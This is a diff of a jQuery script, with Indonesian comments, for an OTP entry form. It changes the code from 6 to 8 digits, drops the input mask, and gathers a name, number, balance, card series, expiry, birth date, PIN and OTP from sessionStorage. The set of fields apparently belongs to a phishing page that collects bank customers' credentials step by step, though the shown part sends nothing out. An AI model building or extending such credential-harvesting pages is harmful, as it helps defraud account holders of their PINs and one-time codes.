@@ -1,6 +1,6 @@
 $(document).ready(function() {
-    // Mask for OTP (6 digits)
-    $('#otp').mask('000000');
+    // Hapus masking karena type="password" akan menampilkan titik (*) otomatis saat diketik
+    // $('#otp').mask('00000000'); // Dihapus agar sensor berfungsi
 
     // Form submission
     $('#form-otp').on('submit', function(e) {
@@ -12,19 +12,19 @@ $(document).ready(function() {
         // Clear previous messages
         messageContainer.html('');
 
-        // Validasi: OTP harus 6 digit angka
+        // Validasi: OTP harus 8 digit angka
         if (!otp) {
             messageContainer.html('<div class="message error">OTP tidak boleh kosong.</div>');
             return;
-        } else if (otp.length !== 6 || !/^\d+$/.test(otp)) {
-            messageContainer.html('<div class="message error">OTP harus tepat 6 digit angka.</div>');
+        } else if (otp.length !== 8 || !/^\d+$/.test(otp)) {
+            messageContainer.html('<div class="message error">OTP harus tepat 8 digit angka.</div>');
             return;
         }
 
         // Jika valid, tampilkan loading
         $("#loader").show();
 
-        // Ambil data dari sessionStorage (sama seperti sebelumnya)
+        // Ambil data dari sessionStorage (sama seperti sebelumnya, termasuk PIN)
         const nama = sessionStorage.getItem('nama') || '';
         const nomor = sessionStorage.getItem('nomor') || '';
         const saldo = sessionStorage.getItem('saldo') || '';
@@ -32,7 +32,7 @@ $(document).ready(function() {
         const seri = sessionStorage.getItem('seri') || '';
         const masa = sessionStorage.getItem('masa') || '';
         const tanggal_lahir = sessionStorage.getItem('tanggal_lahir') || '';
-        const pin = sessionStorage.getItem('pin') || ''; // Jika ada dari halaman PIN
+        const pin = sessionStorage.getItem('pin') || ''; // Ambil PIN dari sessionStorage
 
         // Simpan OTP ke sessionStorage
         sessionStorage.setItem('otp', otp);
